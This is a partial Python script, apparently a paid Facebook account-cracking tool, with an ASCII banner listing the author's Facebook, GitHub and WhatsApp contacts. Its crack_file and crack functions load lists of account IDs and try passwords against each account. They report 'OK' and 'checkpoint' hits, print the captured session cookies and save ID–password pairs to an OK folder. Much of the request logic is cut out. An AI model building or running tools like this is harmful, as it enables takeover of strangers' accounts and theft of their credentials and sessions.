...
time.sleep(5)
os.system('clear')
print("\033[97;1m[\033[92;1m+\033[97;1m] \033[0;92mADD ON MY FACEBOOK")
time.sleep(2)
os.system(f'xdg-open https://facebook.com/abdullahraju404/')
#------------------[ RAJU ]-------------------#
#------------------[ USER-AGENT ]-------------------#
...
os.system("xdg-open https://www.facebook.com/abdullahraju404")
#------------------[ LOGO-LAKNAT ]-----------------#
logo =""" 

        \033[31;1md8888b.  .d8b.     d88b db    db 
        \033[31;1m88  `8D d8' `8b    `8P' 88    88 
        \033[31;1m88oobY' 88ooo88     88  88    88 
        \033[31;1m88`8b   88~~~88     88  88    88 
        \033[31;1m88 `88. 88   88 db. 88  88b  d88 
        \033[31;1m88   YD YP   YP Y8888P  ~Y8888P'                                                                                                                                                                                                                                                  
   \033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
   ╠══[AUTHOR                   • \33[1;38mRAJU HASAN ]\33[1;38m   ║\033[1;31m 
   ╠══[FACEBOOK                 • ABDULLAH RAJU] ║  \033[1;97m  
   ╠══[GITHUB                   • \33[1;38mrajuhasan0 ]   ║\33[1;34m   
   ╠══[WHATSAPP                 • 01792796865 ]  ║\33[1;35m 
   ╠══[TOOLS                    • PAID ]         ║ \33[1;32m   
...
os.system('espeak -a 300 " Welcome,   to,  Raju,  Tools"')
pass
...
def menu():
    ...
    if kabir in ['111']:
        ...
        os.system('xdg-open https://wa.me/+8801792796865')
        os.system("python nono.py")
    elif RAJU in ['3','03']:
        result()
    elif kabir in ['0']:
...
def crack_file():
    ...
    print('\033[1;32m[ Put File Example:  /sdcard/Raju.txt  Etc...]')
...
def setting():
    ...
    print('\033[0;91m==================')
    print('\033[0;91m==================')
    print("\033[97;1m[\033[92;1m1\033[97;1m] FUCKING 1 [\033[0;92mCookies Show \033[0;91mCP ID Not Show\033[1;37m]")
    print("\033[97;1m[\033[92;1m2\033[97;1m] FUCKING 2 [\033[0;93mCp id Show\033[1;37m]")
    print('\033[0;91m==================')
...
def crack(idf,pwv):
    ...
    sys.stdout.write(f"\r\033[100;92m{bo}[RAJU-M1]{P} [{H}{loop}{P}]>~<[{H}{len(id)}{P}] [{H}OK{bo}•{H}{ok}{P}] [{P}{'{:.0%}'.format(loop/float(len(id)))}{P}]\033[0;37m "),
    sys.stdout.flush()
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                print(f'\r\033[0;94m[RAJU-Cp] {idf} • {pw}')
                ...
                print(f'\r\033[0;92m[RAJU-Ok🩷] {idf} • {pw}\n\033[0;93m[😈]= COOKIES • \033[0;92m{kuki} ')
    ...
    for pw in pwv:
        try:
            ...
            if "checkpoint" in po.cookies.get_dict().keys():
                ...
                os.system('espeak -a 300 " Ok,  RAJU,  id"')
                open('OK/'+okc,'a').write(idf+' • '+pw+'\n')
                break
